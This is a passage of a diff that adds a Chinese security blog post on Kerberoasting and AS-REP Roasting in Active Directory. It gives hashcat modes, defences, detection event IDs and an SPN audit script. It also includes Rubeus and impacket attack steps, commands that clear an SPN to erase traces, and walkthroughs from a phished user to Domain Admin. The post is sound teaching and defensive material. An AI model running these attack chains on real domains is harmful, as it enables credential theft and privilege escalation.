= <span class="string">&quot;TEST/test.corp.local&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行Kerberoasting获取TGS票据</span></span><br><span class="line">Rubeus.exe kerberoast /user:target_user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除痕迹</span></span><br><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> target_user <span class="literal">-Clear</span> servicePrincipalName</span><br></pre></td></tr></table></figure>
+
+<p>这种攻击链在BloodHound中表现为”GenericWrite → Force SPN Change → Kerberoast”路径，是内网渗透中的经典提权路线。</p>
+<h2 id="八、两种攻击对比与破解效率"><a href="#八、两种攻击对比与破解效率" class="headerlink" title="八、两种攻击对比与破解效率"></a>八、两种攻击对比与破解效率</h2><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Kerberoasting</th>
+<th>AS-REP Roasting</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>所需权限</td>
+<td>任意域用户</td>
+<td><strong>无需任何凭据</strong></td>
+</tr>
+<tr>
+<td>攻击目标</td>
+<td>注册了SPN的服务账户</td>
+<td>关闭预认证的账户</td>
+</tr>
+<tr>
+<td>Kerberos阶段</td>
+<td>TGS-REP</td>
+<td>AS-REP</td>
+</tr>
+<tr>
+<td>Hashcat Mode</td>
+<td>13100 (RC4) &#x2F; 19700 (AES)</td>
+<td>18200</td>
+</tr>
+<tr>
+<td>破解速度(RTX 4090)</td>
+<td>~2.5 GH&#x2F;s</td>
+<td>~85 MH&#x2F;s</td>
+</tr>
+<tr>
+<td>利用场景</td>
+<td>提权、横向移动</td>
+<td>初始突破、发现弱密码</td>
+</tr>
+<tr>
+<td>目标特征</td>
+<td>高权限服务账户</td>
+<td>遗留账户、配置不当的用户</td>
+</tr>
+</tbody></table>
+<p>实际渗透中，Kerberoasting的RC4票据破解速度约为AS-REP的30倍，因此服务账户的弱密码风险远高于普通用户。但AS-REP Roasting的价值在于<strong>零门槛</strong>——无需任何凭据即可发起，适合外网打点场景。</p>
+<h2 id="九、防御措施"><a href="#九、防御措施" class="headerlink" title="九、防御措施"></a>九、防御措施</h2><h3 id="9-1-账户与密码管理"><a href="#9-1-账户与密码管理" class="headerlink" title="9.1 账户与密码管理"></a>9.1 账户与密码管理</h3><ul>
+<li><strong>使用组托管服务账户（gMSA）</strong>：Windows Server 2012及以上支持，AD自动管理复杂度随机密码轮换，攻击者即使拿到票据也无法破解——这是对抗Kerberoasting的最有效手段。</li>
+<li><strong>服务账户强密码</strong>：如无法使用gMSA，至少设置25位以上随机密码，使用密码管理器生成。</li>
+<li><strong>定期审计SPN</strong>：使用BloodHound或脚本检查不必要的SPN注册并及时移除。</li>
+<li><strong>审计预认证设置</strong>：定期检查关闭预认证的用户（userAccountControl标志位4194304）：</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;DoesNotRequirePreAuth <span class="operator">-eq</span> <span class="variable">$true</span>&#125; \</span><br><span class="line">    <span class="literal">-Properties</span> DoesNotRequirePreAuth</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-2-加密策略"><a href="#9-2-加密策略" class="headerlink" title="9.2 加密策略"></a>9.2 加密策略</h3><p>在组策略中配置Kerberos仅使用AES-256加密类型，禁止RC4：</p>
+<ul>
+<li><strong>组策略路径</strong>：<code>Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options\Network security: Configure encryption types allowed for Kerberos</code></li>
+<li>虽然AES票据理论上也可破解（mode 19700），但计算速度极慢，实际威慑力显著。</li>
+</ul>
+<h3 id="9-3-监控与检测"><a href="#9-3-监控与检测" class="headerlink" title="9.3 监控与检测"></a>9.3 监控与检测</h3><ul>
+<li><strong>Event ID 4769</strong>：大量TGS-REQ请求，尤其是Ticket Encryption Type为0x17（RC4）的大量申请，需立即排查。</li>
+<li><strong>Event ID 4768</strong>：Pre-Authentication Type为0的TGT请求，来自异常IP时需要关注。</li>
+<li><strong>蜜罐账户</strong>：创建带有弱密码和SPN的蜜罐服务账户，任何人对其执行Kerberoasting即告警——这是检测攻击行为的高性价比手段。</li>
+<li><strong>网络分段</strong>：限制普通用户网段直接访问域控88端口，通过IDS&#x2F;IPS检测异常Kerberos流量模式。</li>
+</ul>
+<h3 id="9-4-审计脚本"><a href="#9-4-审计脚本" class="headerlink" title="9.4 审计脚本"></a>9.4 审计脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定期审计所有SPN注册账户</span></span><br><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-like</span> <span class="string">&quot;*&quot;</span>&#125; \</span><br><span class="line">    <span class="literal">-Properties</span> ServicePrincipalName |</span><br><span class="line">    <span class="built_in">Select-Object</span> Name, SamAccountName, ServicePrincipalName |</span><br><span class="line">    <span class="built_in">Export-Csv</span> <span class="literal">-Path</span> <span class="string">&quot;SPN_Audit_<span class="variable">$</span>(Get-Date -Format yyyyMMdd).csv&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="十、实战场景"><a href="#十、实战场景" class="headerlink" title="十、实战场景"></a>十、实战场景</h2><h3 id="场景一：经典Kerberoasting提权"><a href="#场景一：经典Kerberoasting提权" class="headerlink" title="场景一：经典Kerberoasting提权"></a>场景一：经典Kerberoasting提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 钓鱼获得普通域用户 user01 / Summer2024!</span><br><span class="line">2. BloodHound枚举SPN -&gt; 发现MSSQLSvc关联sql_svc账户</span><br><span class="line">3. Rubeus.exe kerberoast 导出TGS票据</span><br><span class="line">4. hashcat -m 13100 字典破解 -&gt; sql_svc:Summer2024!</span><br><span class="line">5. sql_svc属于Domain Admins组 -&gt; 域完全控制</span><br></pre></td></tr></table></figure>
+
+<h3 id="场景二：AS-REP-Roasting外网打点"><a href="#场景二：AS-REP-Roasting外网打点" class="headerlink" title="场景二：AS-REP Roasting外网打点"></a>场景二：AS-REP Roasting外网打点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. LDAP匿名查询枚举域用户列表</span><br><span class="line">2. impacket-GetNPUsers批量探测关闭预认证的用户</span><br><span class="line">3. 发现backup用户易受AS-REP Roasting攻击</span><br><span class="line">4. hashcat -m 18200 破解 -&gt; backup:Admin123!</span><br><span class="line">5. 使用backup凭据获取域内初始立足点</span><br></pre></td></tr></table></figure>
+
+<h3 id="场景三：SetSPN权限滥用提权"><a href="#场景三：SetSPN权限滥用提权" class="headerlink" title="场景三：SetSPN权限滥用提权"></a>场景三：SetSPN权限滥用提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. BloodHound发现user01对helpdesk_svc有GenericWrite权限</span><br><span class="line">2. Set-ADUser为helpdesk_svc添加SPN</span><br><span class="line">3. Rubeus kerberoast获取helpdesk_svc的TGS票据</span><br><span class="line">4. hashcat破解获得密码 -&gt; Domain Admins组成员</span><br><span class="line">5. Set-ADUser清除SPN，抹去痕迹</span><br></pre></td></tr></table></figure>
+
+<h2 id="十一、免责声明"><a href="#十一、免责声明" class="headerlink" title="十一、免责声明"></a>十一、免责声明</h2><blockquote>
+<p><strong>本文所讨论的技术和方法仅供安全研究与授权的渗透测试使用。</strong></p>
+<p>未经系统所有者明确书面授权，对计算机系统进行任何形式的攻击、渗透测试或安全评估均属违法行为，可能违反《中华人民共和国网络安全法》《刑法》等相关法律法规。作者不承担因读者不当使用本文所述技术而导致的任何法律责任。</p>
+<p>如果您是网络防御者，请利用本文知识加固您的Active Directory环境，定期审计SPN配置，确保所有服务账户使用gMSA或强密码策略。</p>
+<p><strong>记住：技术无善恶，但使用技术的人有选择。用这些知识保护系统，而不是破坏它。</strong></p>
+</blockquote>
+<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://files.sans.org/summit/hackfest2014/PDFs/Kerberoasting.pdf">Tim Medin - Kerberoasting (SANS Hackfest 2014)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus - GhostPack</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">Impacket - Fortra</a></li>
+<li><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat Example Hashes</a></li>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview">gMSA Overview - Microsoft Learn</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag"># 密码学</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Post-exploit-persistence-linux/" rel="prev" title="后渗透：Linux权限维持">
+                  <i class="fa fa-angle-left"></i> 后渗透：Linux权限维持
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Post-exploit-persistence-windows/" rel="next" title="后渗透：Windows权限维持">
+                  后渗透：Windows权限维持 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
